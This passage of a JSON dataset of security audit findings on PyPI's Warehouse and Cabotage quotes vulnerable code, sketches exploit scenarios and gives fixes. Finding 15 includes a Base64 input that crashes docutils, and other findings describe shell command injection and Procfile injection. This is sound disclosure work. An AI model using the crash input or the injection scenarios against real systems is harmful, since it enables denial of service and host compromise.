upload endpoint (or any other endpoint that accepts basic authentication) to check which accounts have already been disabled. Separately, the attacker may be able to selectively disclose potential credentials, using an accounts subsequent disablement as an oracle for the overall validity of their stolen credentials (much like a stolen credit card testing service). Recommendations We recommend that the checks performed in _basic_auth_check always include a check against login_service.check_password before returning distinct error messages to the authenticating client. If the users password cannot be checked when disabled for technical reasons, we recommend returning a context-free error to avoid an information leak here.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Potential race conditions in search locking ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse uses Elasticsearch for its search back end, and uses Redis to synchronize stateful tasks dispatched to the search back end (such as reindexing and un-indexing of projects). This synchronization is done with a redis-py Lock object, wrapped into a custom SearchLock context manager: class SearchLock : def __init__ ( self , redis_client, timeout= None , blocking_timeout= None ): self .lock = redis_client.lock( \"search-index\" , timeout=timeout, blocking_timeout=blocking_timeout ) def __enter__ ( self ): if self .lock.acquire(): return self else : raise redis.exceptions.LockError( \"Could not acquire lock!\" ) def __exit__ ( self , type , value, tb): self .lock.release() Figure 6.1: The SearchLock context manager ( warehouse/warehouse/search/tasks.py#102115 ) SearchLock accepts a timeout parameter, which is used within the interior Redis lock to auto-expire the lock if the timeout is exceeded. However, this timeout is not handled in SearchLock s __enter__ or __exit__ , meaning that the underlying lock can expire while appearing to still be held by whatever Python code is executing the context manager. Exploit Scenario An attacker leverages the uncontrolled lock release to trigger a reindex , reindex_project , or unindex_project task opportunely, resulting in either stale or misleading information in the search index (and consequently in search results returned to PyPI users). Given the length of timeouts allowed by current SearchLock users (between 15 seconds and 30 minutes), we consider this attack dicult. Recommendations We recommend that SearchLock be refactored or rewritten to handle the possibility of an interior timeout. In particular, redis-pys Lock class is itself a context manager, so SearchLock could be rewritten as a wrapper context manager without any specic timeout handling needed (since it will be performed correctly by Lock s own interior context manager).",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Use of multiple distinct URL parsers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse makes direct use of at least three separate URL parser implementations: The Python standard librarys urllib.parse implementation; The rfc3986 package;    urllib3 s implementation, via uses of requests . These implementations are occasionally composed, such as in SNS signing certicate retrieval: cert_url_p = urllib.parse.urlparse(cert_url) cert_scheme = cert_url_p.scheme cert_host = cert_url_p.netloc if cert_scheme != \"https\" : raise InvalidMessageError( \"Invalid scheme for SigningCertURL\" ) if _signing_url_host_re.fullmatch(cert_host) is None : raise InvalidMessageError( \"Invalid location for SigningCertURL\" ) Figure 7.1: urlparse for domain checking, followed by use in requests ( warehouse/warehouse/utils/sns.py#7783 ) URLs are specied in conicting RFCs and non-RFC standards, and real-world URL parsers frequently exhibit confusion vulnerabilities . When composed together, parsers that disagree on a URLs contents can produce exploitable open redirects, requests to unintended domains or paths, and similar behavior. Exploit Scenario An attacker who discovers domain confusion in urlparse may be able to induce an open redirect through Warehouse via the Referer header, due to Warehouses use of urlparse in is_safe_url : def is_safe_url (url, host= None ): if url is not None : url = url.strip() if not url: return False # Chrome treats \\ completely as / url = url.replace( \"\\\\\" , \"/\" ) # Chrome considers any URL with more than two slashes to be absolute, but # urlparse is not so flexible. Treat any url with three slashes as unsafe. if url.startswith( \"///\" ): return False url_info = urlparse(url) # Forbid URLs like http:///example.com - with a scheme, but without a # hostname. # In that URL, example.com is not the hostname but, a path component. # However, Chrome will still consider example.com to be the hostname, # so we must not allow this syntax. if not url_info.netloc and url_info.scheme: return False # Forbid URLs that start with control characters. Some browsers (like # Chrome) ignore quite a few control characters at the start of a # URL and might consider the URL as scheme relative. if unicodedata.category(url[ 0 ])[ 0 ] == \"C\" : return False return ( not url_info.netloc or url_info.netloc == host) and ( not url_info.scheme or url_info.scheme in { \"http\" , \"https\" } ) Figure 7.2: urlparse in is_safe_url (excerpted from warehouse/warehouse/utils/http.py#2253 ) Separately, an attacker who discovers a parser between two or more of Warehouses URL parsers may be able to spoof SNS messages (due to the use of a URL for SNS certicate retrieval), manipulate renderings of URLs on public pages, or perform other unintended transformations on trusted data. Recommendations Short term, we recommend that Warehouse conduct a review of its URL parsing behavior, including identifying all sites where urlparse and similar APIs are used, to ensure that, in particular, domain and path confusion cannot occur. Long term, we recommend that Warehouse reduce the number of URL parsers that it directly and indirectly depends on. In particular, given that rfc3986 and urllib3 are already dependencies, we recommend standardizing on eithers parsing and validation routines and replacing all uses of urllib.parse.urlparse outright.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Overly permissive CSP headers on XML views ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouses ordinary Content Security Policy is overridden on a handful of XML-only views, including the views responsible for PyPIs RSS feeds and sitemaps: def sitemap_index (request): request.response.content_type = \"text/xml\" request.find_service(name= \"csp\" ).merge(XML_CSP) Figure 8.1: CSP customization on a sitemap view ( warehouse/warehouse/sitemap/views.py#4750 ) The contents of XML_CSP is a single unsafe-inline rule for style-src , meaning that XML views allow arbitrary inline styles to be loaded. Exploit Scenario This nding is purely informational; all aected views are primarily static and generated from escaped data, minimizing the risk of stylesheet injection. Recommendations We recommend that Warehouse remove XML_CSP entirely and avoid special-casing the CSP on XML views.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Missing Permissions-Policy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse currently serves a variety of best-practice HTTP headers, including CSP headers, X-Content-Type-Options , and Strict-Transport-Security . Its current headers notably do not include Permissions-Policy , which is a W3C standard for browser feature control. Serving a Permissions-Policy in the response headers gives websites an additional defense in depth against XSS, compromised CDNs, and other vectors through which an attacker may be able to run arbitrary JavaScript on the websites trusted origins. Exploit Scenario An attacker with a separate JavaScript injection vector (such as stored XSS or a CDN compromise) runs arbitrary JavaScript code on PyPIs trusted origins, including JavaScript that makes use of browser feature APIs such as the microphone, camera, geolocation service, payments API, and so forth. Depending on the victims browser, they may or may not receive a prompt for any or all of these feature requests; given PyPIs status as a high-trust domain, they may accept such feature requests without fully evaluating them. A Permissions-Policy is purely a defense in depth; as a result, we consider its diculty high in the absence of a known JavaScript injection vector. Recommendations We recommend that Warehouse evaluate and deploy a Permissions-Policy header that exposes only Warehouses own (minimal) browser feature requirements while forbidding access to all other browser features. A potential Permissions-Policy is supplied below. Permissions-Poicy: publickey-credentials-create=(self), publickey-credentials-get=(self), accelerometer=(), ambient-light-sensor=(), autoplay=(), battery=(), camera=(), display-capture=(), document-domain=(), encrypted-media=(), execution-while-not-rendered=(), execution-while-out-of-viewport=(), fullscreen=(), gamepad=(), geolocation=(), gyroscope=(), hid=(), identity-credentials-get=(), idle-detection=(), local-fonts=(), magnetometer=(), microphone=(), midi=(), otp-credentials=(), payment=(), picture-in-picture=(), screen-wake-lock=(), serial=(), speaker-selection=(), storage-access=(), usb=(), web-share=(), xr-spatial-tracking=(); Figure 9.1: A potential Permissions-Policy for Warehouse",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Domain separation in le digests ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouses File model (corresponding to a release distribution) contains an md5_digest column with a unique constraint, representing the distributions MD5 hash: md5_digest = mapped_column(Text, unique= True , nullable= False ) Figure 10.1: File.md5_digest denition ( warehouse/warehouse/packaging/models.py#670 ) MD5 is considered an insecure cryptographic digest with well-known and practical (from consumer hardware) collision attacks. This MD5 hash is subsequently used to determine whether a le being uploaded has already been uploaded: def _is_duplicate_file (db_session, filename, hashes): \"\"\" Check to see if file already exists, and if it's content matches. A file is considered to exist if its filename *or* blake2 digest are present in a file row in the database. Returns: - True: This file is a duplicate and all further processing should halt. - False: This file exists, but it is not a duplicate. - None: This file does not exist. \"\"\" file_ = ( db_session.query(File) .filter( (File.filename == filename) | (File.blake2_256_digest == hashes[ \"blake2_256\" ]) ) .first() ) if file_ is not None : return ( file_.filename == filename and file_.sha256_digest == hashes[ \"sha256\" ] and file_.md5_digest == hashes[ \"md5\" ] and file_.blake2_256_digest == hashes[ \"blake2_256\" ] ) return None Figure 10.2: File deduplication logic on uploads ( warehouse/warehouse/forklift/legacy.py#752781 ) Notably, the logic above returns None if an uploaded le does not have a matching lename or Blake2 hash, even if that le has a matching MD5 hash. This signals to the caller that the le does not exist and allows Warehouses upload logic to continue to the File creation step, which subsequently fails due to the unique constraint on File.md5_digest . Exploit Scenario An attacker contrives large numbers of distinct release distributions with colliding MD5 digests and repeatedly uploads them to PyPI, causing database pressure in the form of constraint violations and large volumes of rollbacks (due to the late stage at which the violation occurs here). We currently consider the impact of this scenario low, as the unique constraint prevents any distributions with colliding MD5 digests from entering further into Warehouse. However, we note that an attacker who manages to bypass this constraint may be able to leverage TOB-PYPI-11 and TOB-PYPI-14 to induce further confusion between legitimate and attacker-controlled les, including for downstream consumers of PyPI. Recommendations Short term, we recommend that Warehouse check for domain separation between its supported hashes, and reject any le exhibiting separation (i.e., any le for which some cryptographic digests compare equals but others do not). This should always be sound (in terms of not rejecting legitimate uploads), since MD5 is still a diuse compression function with an extremely low likelihood of accidental collisions. Long term, we recommend that Warehouse remove File.md5_digest and all associated machinery entirely, and limit its use of digests for le deduplication to collision-resistant ones (such as the already present SHA256 and Blake2 digests). We recommend that Warehouse retain any domain separation checks even if it does not store MD5 digests, due to TOB-PYPI-14 .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "11. Object storage susceptible to TOC/TOU due to temporary les ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse makes use of temporary les in a variety of places, both through Pythons NamedTemporaryFile API and through a xed lename placed within a temporary directory created by the TemporaryDirectory API. The upload endpoint uses one such le: with tempfile.TemporaryDirectory() as tmpdir: temporary_filename = os.path.join(tmpdir, filename) # Buffer the entire file onto disk, checking the hash of the file as we # go along. with open (temporary_filename, \"wb\" ) as fp: ... Figure 11.1: Use of a named temporary le for response buering ( warehouse/warehouse/forklift/legacy.py#12321237 ) Warehouses primary reason for using named temporary les appears to be to satisfy other API designs, such as the IGenericFileStorage interfaces use of le paths: class IGenericFileStorage (Interface): ... def store (path, file_path, *, meta= None ): \"\"\" Save the file located at file_path to the file storage at the location specified by path. An additional meta keyword argument may contain extra information that an implementation may or may not store. \"\"\" Figure 11.2: The IGenericFileStorage.store interface ( warehouse/warehouse/packaging/interfaces.py#2152 ) Warehouses use of named temporary les conforms to best practices: full temporary paths are not predictable, and paths are opened at the same time as creation to prevent trivial TOC/TOU-style attacks . At the same time, any use of named temporary les without transfer of a synchronized handle or le descriptor is susceptible to TOC/TOU: an attacker with the ability to monitor these directories or otherwise determine the exact path given to store may be able to rewrite that paths contents after validation but before storage, resulting in an inconsistent and potentially exploitable split state between the PyPI database and the artifacts being served to clients. Exploit Scenario As mentioned above, an attacker with the ability to monitor temporary les or otherwise determine the paths passed into a particular IGenericFileStorage.store implementation may be able to rewrite the content at that path after Warehouse has already validated and produced a digest for it, resulting in a split state between the database and the object store. The exploitability of this state depends on the stores own integrity guarantees, as well as whether downstream clients perform digest checks on their distribution downloads. This nding is purely informational; an attacker with the ability to monitor temporary le directories and mount this attack is likely to have other lateral and horizontal capabilities. This nding and associated recommendations are presented as part of a defense-in-depth strategy. However, we note that an attacker who manages to exploit this may be able to additionally leverage TOB-PYPI-10 and TOB-PYPI-14 to further induce potentially exploitable confusion in PyPI and its downstream users. Recommendations We recommend that the IGenericFileStorage.store interface (and all implementers) be refactored to take one of the following input forms, rather than a named le path: 1. 2. An in-memory buer (such as a bytes or memoryview ); An open le handle or descriptor (such as a le-like object); Option (1) will entirely mitigate the TOC/TOU, at the cost of potentially unacceptable memory usage. Option (2) will either partially or entirely mitigate the TOC/TOU, depending on the callers context: contexts where the le-like object is derivable entirely from the underlying HTTP request (like release le upload) will be entirely mitigated, while contexts where the le-like object is still held from a temporary le may still be manipulable depending on the attackers local abilities.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "12. HTTP header is silently trusted if token mismatches ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse uses a special header to determine if the request is coming from a trusted proxy. On one hand, If a request contains the X-Warehouse-Token header, and its value matches a shared secret, the code will trust the request and gather information such as the client IP from other special X-Warehouse-* headers. On the other hand, if this X-Warehouse-Token header is not present, Warehouse will gather these details from traditional headers such as X-Forwarded-For . However, this does not account for the special case where the X-Warehouse-Token header is present but its value does not match the shared secret. This is likely an unintended state that may occur if the system is misconguredfor example, if the secret set in the proxy does not match the secret set in the Warehouse deployment. When presented with such a request, the current implementation will silently opt to use the traditional headers, which may result in unexpected behavior. def __call__ ( self , environ, start_response): # Determine if the request comes from a trusted proxy or not by looking # for a token in the request. request_token = environ.get( \"HTTP_WAREHOUSE_TOKEN\" ) if request_token is not None and hmac.compare_digest( self .token, request_token) : # Compute our values from the environment. proto = environ.get( \"HTTP_WAREHOUSE_PROTO\" , \"\" ) remote_addr = environ.get( \"HTTP_WAREHOUSE_IP\" , \"\" ) remote_addr_hashed = environ.get( \"HTTP_WAREHOUSE_HASHED_IP\" , \"\" ) # (...) # If we're not getting headers from a trusted third party via the # specialized Warehouse-* headers, then we'll fall back to looking at # X-Forwarded-* headers, assuming that whatever we have in front of us # will strip invalid ones. else : proto = environ.get( \"HTTP_X_FORWARDED_PROTO\" , \"\" ) # Special case: if we don't see a X-Forwarded-For, this may be a local # development instance of Warehouse and the original REMOTE_ADDR is accurate remote_addr = _forwarded_value( environ.get( \"HTTP_X_FORWARDED_FOR\" , \"\" ) , self .num_proxies ) or environ.get( \"REMOTE_ADDR\" ) # (...) Figure 12.1: The token check is used to determine which headers to trust ( warehouse/warehouse/utils/wsgi.py#5294 ) Exploit Scenario The X-Warehouse-Token secret is refreshed on the Warehouse deployment, but not on the proxy. New requests owing through the proxy use the wrong X-Warehouse-Token value. Warehouse silently starts using the X-Forwarded-For header to determine the remote users address. An attacker uses this fact to forge her IP address and bypass login rate limits. Recommendations Short term, separately handle the case where the header is present but has an unexpected value and report an error or refuse to handle such requests. Such a state is an indication of a system misconguration or a malicious request, both of which should be reported to the system operators.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Bleach library is deprecated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "The readme_renderer library currently sanitizes the rendered README HTML code using the bleach library. On January 23, 2023, the library was declared deprecated : Bleach sits on top of--and heavily relies on--html5lib which is no longer in active development. It is increasingly dicult to maintain Bleach in that context and I think it's nuts to build a security library on top of a library that's not in active development. (...) While the library will continue to receive security updates for the time being, it may not receive new features or support for new standards. Recommendations Short term, look for a suitable alternative under active development and support, and replace bleach with it. Long term, periodically review critical system dependencies and ensure they are supported and receive security patches when required.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "14. Weak hashing in storage backends ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse has multiple implementations of IFileStorage (itself a subclass of IGenericFileStorage ), of which at least two are used in production on PyPI ( B2FileStorage as a hot object store, and S3ArchiveFileStorage as a cold object store). As implementers of IGenericFileStorage , both supply implementations of get_checksum , which in turn returns an object-store-reported MD5 hash for the given path: def get_checksum ( self , path): path = self ._get_path(path) try : return self .bucket.get_file_info_by_id( self .bucket.get_file_info_by_name(path).id_ ).content_md5 except b2sdk.v2.exception.FileNotPresent: raise FileNotFoundError ( f \"No such key: { path !r} \" ) from None Figure 14.1: B2FileStorage.get_checksum ( warehouse/warehouse/packaging/services.py#173180 ) def get_checksum ( self , path): try : return ( self .bucket.Object( self ._get_path(path)).e_tag.rstrip( '\"' ).lstrip( '\"' ) ) except botocore.exceptions.ClientError as exc: if exc.response[ \"ResponseMetadata\" ][ \"HTTPStatusCode\" ] != 404 : # https://docs.aws.amazon.com/AmazonS3/latest/API/API_HeadObject.html#API_HeadObject_R equestBody raise raise FileNotFoundError ( f \"No such key: { path !r} \" ) from None Figure 14.2: GenericS3BlobStorage.get_checksum ( warehouse/warehouse/packaging/services.py#221230 ) These M D5 hashes are used in the asynchronous reconcile_file_storage task to iterate through currently uncached (meaning present only in S3 and not Backblaze B2) les and reconcile the two by updating the cache (and the database to match the caches state). As mentioned in TOB-PYPI-10 , MD5 is an insecure cryptographic digest that is easily collide-able on consumer hardware. As a result, an attacker who is able to compromise either the hot (B2) or cold (S3) object storage and introduce objects with colliding digests may be able to induce confusion during reconciliation between the two, including to the eect of convincing PyPI that the two are reconciled when actually serving les with dierent contents. Exploit Scenario An attacker with write access to either the B2 or S3 object storage inserts new paths with colliding MD5 hashes, or overwrites existing paths to contain new content with colliding MD5 hashes. Subsequent periodic runs of reconcile_file_storage under Warehouse silently succeed, allowing the attacker to persist their maliciously injected objects. This may additionally aect clients that neglect to verify SHA256 distribution hashes. Recommendations We recommend that, where possible, Warehouse employ stronger cryptographic digests for le integrity in each supported le and/or object back end. In particular, we determined that AWS S3 supports SHA256 and that Backblaze B2 supports SHA-1 (which, while stronger than MD5, is also considered broken for any application that requires collision resistance, including digital signatures or le integrity in the presence of malicious modications). Given that the two do not support a common subset of strong cryptographic digests, we note that the above recommendation is not immediately actionable. As a short-term remediation, we recommend that Warehouse utilize each services support for arbitrary metadata to attach a strong cryptographic digest to each object and check that metadata when reconciling between the two. This digest will not present as strong of a guarantee as the ocially supported digests, but it will require the attacker to fully compromise both object stores at once in order to mount an attack, rather than just one.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Uncaught exception with crafted README ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse uses readme_renderer to generate HTML from user-supplied project metadata. readme_renderer uses docutils in its reStructuredText renderer. A docutils bug causes an unhandled IndexError while handling specially crafted inputs. LVU8LAwsCT4= Figure 15.1: The Base64 representation of an input that causes an exception Exploit Scenario An attacker crafts a package with a reStructuredText README, populating the description metadata eld with the contents above, and uploads it to Warehouse. During processing, docutils throws an IndexError , causing Warehouse to reply with a 500 Internal Server Error. As an unhandled exception does not adversely aect users other than the one sending the request or Warehouse as a whole, this nding is informational. Recommendations We recommend that readme_renderer update docutils once a x is released.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. ReDoS via zxcvbn-python dependency ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Warehouse performs password strength estimation on user passwords, as part of preventing users from choosing unacceptably weak passwords. It uses Dropboxs zxcvbn algorithm to perform password strength estimation, via the zxcvbn-python library. Additionally, Warehouse has a large password length limit: MAX_PASSWORD_SIZE = 4096 Figure 16.1: The Warehouse password length limit ( warehouse/warehouse/accounts/forms.py#44 ) zxcvbn has reported ReDoS vulnerabilities in it; combined with Warehouses large password limit, an attacker could issue contrived passwords during either account registration or password change ows to potentially waste computational and/or memory resources in a Warehouse deployment. Exploit Scenario This nding is purely informational. We believe that it has virtually no impact, like many ReDoS vulnerabilities , due to Warehouses deployment architecture. Recommendations We make no recommendation for this nding.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "17. Use of shell=True in subprocesses ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotage denes at least two asynchronous task helpers that invoke Buildkits buildctl (or a wrapper, like buildctl-daemonless.sh ) via the subprocess module to build container images (either for images or dedicated releases): completed_subprocess = subprocess.run( \" \" .join(buildctl_command + buildctl_args), env={ 'BUILDKIT_HOST' : buildkitd_url, 'HOME' : tempdir}, shell= True , cwd=tempdir, check= True , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text= True , ) Figure 17.1: Use of subprocess.run to perform a release build ( cabotage-app/cabotage/celery/tasks/build.py#314319 ) completed_subprocess = subprocess.run( \" \" .join(buildctl_command + buildctl_args), env={ 'BUILDKIT_HOST' : buildkitd_url, 'HOME' : tempdir}, shell= True , cwd= \"/tmp\" , check= True , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text= True , ) Figure 17.2: Use of subprocess.run to perform an image build ( cabotage-app/cabotage/celery/tasks/build.py#658663 ) In both of these cases, subprocess.run is invoked with shell=True , causing the given command to be spawned in a command interpreter rather than directly through the host OSs process creation APIs. This means that the given command is interpreted using the command interpreters (typically POSIX sh ) syntax, which in turn may allow an attacker to inject unintended commands into the executed sequence. In the case of these two image building routes opportunities for injection exist due to the use of user-controlled inputs during argument construction, such as release.repository_name and image.repository_name : f \"type=image,name= { registry } / { release.repository_name } :release- { release.version } ,pus h=true { insecure_reg } \" , Figure 17.3: Command argument construction with user-controlled inputs ( cabotage-app/cabotage/celery/tasks/build.py#119 ) Other sources of user-controllable input may also exist. Exploit Scenario An attacker with the ability to create applications within a Cabotage deployment may be able to contrive an images repository name such that builds created from that image (or releases of that image) run arbitrary shell commands in the context of the orchestrating host. This may in turn allow the attacker to access credentials or resources that are normally only available to Cabotage itself, or move laterally into (or modify) other application containers managed by Cabotage. Recommendations Short term, we recommend removing shell=True from these invocations of subprocess.run . Based on our review, we believe that their use is unnecessary due to a lack of any intentional shell syntax in the build commands. Long term, we recommend evaluating a Python library that can perform image builds without the use of subprocesses. One potential candidate library is docker-py , although it notably does not currently support BuildKit .",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "18. Use of HMAC with SHA1 for GitHub webhook payload validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "Cabotage receives various GitHub webhook payloads during normal operation, including for security-sensitive actions like automated deployments. To prevent an attacker from providing a spoofed or inauthentic payload, it veries an HMAC in the payload requests headers against a pre-shared secret: def validate_webhook ( self ): if self .webhook_secret is None : return True return hmac.compare_digest( request.headers.get( 'X-Hub-Signature' ).split( '=' )[ 1 ], hmac.new( self .webhook_secret.encode(), msg=request.data, digestmod=hashlib.sha1).hexdigest() ) Figure 18.1: HMAC computation and comparison ( cabotage-app/cabotage/server/ext/github_app.py#4147 ) The current HMAC construction uses SHA1 as the message digest algorithm. While considered insecure in digital signature schemes due to its lack of collision resistance, SHA1 is not currently considered broken in HMAC constructions (due to HMACs production of an unpredictable intermediate hash state from the shared secret). At the same time, Gi tHub supplies a migration path to HMAC with SHA256, via the X-Hub-Signature-256 header. This header is already present on all webhook payload requests, meaning that webhook-receiving clients do not require any additional conguration to upgrade to a stronger cryptographic digest in their HMAC calculations. Exploit Scenario There are no currently known real-world attacks on HMAC-with-SHA1. As such, we consider this a low-severity nding with high diculty. Recommendations We recommend that Cabotage perform HMAC validation using HMAC-with-SHA256 against X-Hub-Signature-256 .",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. Potential container image manipulation through malicious Procle ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "During image building, Cabotage collects an images processes by parsing either Procfile.cabotage or Profile at the git SHA ref associated with the build: procfile_body = _fetch_github_file(image.application.github_repository, image.commit_sha, access_token=access_token, filename= 'Procfile.cabotage' ) if procfile_body is None : procfile_body = _fetch_github_file(image.application.github_repository, image.commit_sha, access_token=access_token, filename= 'Procfile' ) if procfile_body is None : raise BuildError( f 'No Procfile.cabotage or Procfile found in root of { image.application.github_repository } @ { image.commit_sha } ' ) image.dockerfile = dockerfile_body image.procfile = procfile_body db.session.commit() #  try : processes = procfile.loads(procfile_body) except ValueError as exc: raise BuildError( f 'error parsing Procfile: { exc } ' ) Figure 19.1: Procle retrieval and parsing ( cabotage-app/cabotage/celery/tasks/build.py#438462 ) The parsed contents of the retrieved Procle are then used to construct a map of envconsul congurations, which are then merged into a Dockerle template: @property def release_build_context_tarfile ( self ): process_commands = \"\\n\" .join([ f 'COPY envconsul- { process_name } .hcl /etc/cabotage/envconsul- { process_name } .hcl' for process_name in self .envconsul_configurations]) dockerfile = RELEASE_DOCKERFILE_TEMPLATE.format(registry=current_app.config[ 'REGISTRY_BUILD' ], image= self .image_object, process_commands=process_commands) if self .dockerfile: dockerfile = self .dockerfile return tarfile_context_for_release( self , dockerfile) @property def release_build_context_configmap ( self ): process_commands = \"\\n\" .join([ f 'COPY envconsul- { process_name } .hcl /etc/cabotage/envconsul- { process_name } .hcl' for process_name in self .envconsul_configurations]) dockerfile = RELEASE_DOCKERFILE_TEMPLATE.format(registry=current_app.config[ 'REGISTRY_BUILD' ], image= self .image_object, process_commands=process_commands) if self .dockerfile: dockerfile = self .dockerfile return configmap_context_for_release( self , dockerfile) Figure 19.2: Construction of COPY directives from envconsul congurations ( cabotage-app/cabotage/server/models/projects.py#544558 ) RELEASE_DOCKERFILE_TEMPLATE = \"\"\" FROM {registry} / {image.repository_name} :image- {image.version} COPY --from=hashicorp/envconsul:0.13.1 /bin/envconsul /usr/bin/envconsul COPY --chown=root:root --chmod=755 entrypoint.sh /entrypoint.sh {process_commands} USER nobody ENTRYPOINT [\"/entrypoint.sh\"] CMD [] \"\"\" Figure 19.3: Dockerle template ( cabotage-app/cabotage/utils/release_build_context.py#816 ) This template is then used to perform an image build for the release. Exploit Scenario Similar to TOB-PYPI-17, an attacker with the ability to create applications within a Cabotage deployment may be able to contrive a Procfile or Procfile.cabotage within a targeted repository such that the build steps on the orchestrating host include unintended or modied Dockerle commands. In a preliminary investigation, we determined that the third-party Procle parser used by Cabotage correctly forbids newlines in process type specications, likely preventing injections of entirely new Dockerle commands. However, other sources of newline injections may still exist. Separately, we determined that Cabotages Procle parser allows non-newline whitespaces in the process type eld: _PROCFILE_LINE = re.compile( '' .join([ r '^(?P<process_type>.+?):\\s*' , r '(?:env(?P<environment>(?:\\s+.+?=.+?)+)\\s+)?' , r '(?P<command>.+)$' , ]) ) Figure 19.4: Whitespace exibility in the third-party Procle parser ( procfile/procfile/__init__.py#1319 ) This may allow an attacker to manipulate the COPY directives specically, including potentially allowing a pivot by copying sensitive materials from the orchestrating host into the attackers image. Recommendations Short term, we recommend that Cabotage perform additional validation on its parsed Procles, including ensuring that the process type eld contains no whitespace or other characters that may change the behavior of the Dockerle template. Long term, we recommend that Cabotage take a more structured approach to Dockerle creation, including potentially evaluating libraries that expose a sanitizing builder pattern for Dockerle commands. Separately, we recommend that Cabotage consider replacing its support for Procles with a well-specied (potentially bespoke) schema, such as jobs specied in a TOML-formatted table, as part of limiting parser ambiguities. We also note that the current third-party Procle parser appears to be unmaintained as of 2015.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Repository confusion during image building ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-pypi-warehouse-securityreview.pdf",
        "body": "As part of image building during deployments, Cabotage uses the _fetch_commit_sha_for_ref helper to retrieve a concrete SHA for a potentially symbolic reference (such as a branch or tag). This helper uses the GitHub REST APIs /repos/{repo}/commits/{ref} endpoint internally, which returns a JSON response containing the concrete SHA: def _fetch_commit_sha_for_ref (github_repository= \"owner/repo\" , ref= \"main\" , access_token= None ): headers = { 'Accept' : 'application/vnd.github+json' , 'X-GitHub-Api-Version' : '2022-11-28' , } if access_token is not None : headers[ 'Authorization' ] = f 'token { access_token } ' response = requests.get( f \"https://api.github.com/repos/ { github_repository } /commits/ { ref } \" , params={ 'ref' : ref }, headers=headers, ) if response.status_code == 404 : return None if response.status_code == 200 : return response.json()[ 'sha' ] response.raise_for_status() Figure 20.1: _fetch_commit_sha_for_ref ( cabotage-app/cabotage/celery/tasks/build.py#377395 ) Because of how GitHub optimizes the object grap h between forks of a repository, this can result in surprising behavior when _fetch_commit_sha_for_ref is called with a SHA reference that belongs to a fork, rather than the spe cied repository: the API call succeeds as if the SHA reference is on the specied repository. This results in a source of exploitable confusion: the GitHub API will return contents for an attacker-controlled fork of a repository with just a SHA reference to the fork, and not the full repository slug. Exploit Scenario An attacker has deployment access to an application on an instance of Cabotage, and wishes to surreptitiously deploy a copy of the application from their malicious forked repository on GitHub rather than the intended repository. By updating the branch setting under deployment automation to contain a SHA from the malicious fork, they are able to confuse the underlying GitHub REST API call into returning contents from their fork, despite no changes to the repository setting itself. Consequently, the attacker is able to deploy from their malicious repository while appearing to deploy from the trusted repository. Recommendations GitHubs internal network model for repository forks makes this dicult to mitigate directly: the /commits/ API does not make a distinction between forks and non-forks in its response, and there appear to be no other public APIs capable of determining whether a SHA ref belongs to a repository versus a potentially malicious fork. As an indirect mitigation, we recommend that _fetch_commit_sha_for_ref be modied to also enumerate the tags and branches for the given repository and compare their SHA refs against the given one, failing if none match. This will prevent an impostor commit, at the cost of several additional REST API round-trips. An example of this procedure can be found in Chainguards clank tool.",
        "labels": [
            "Trail of Bits",
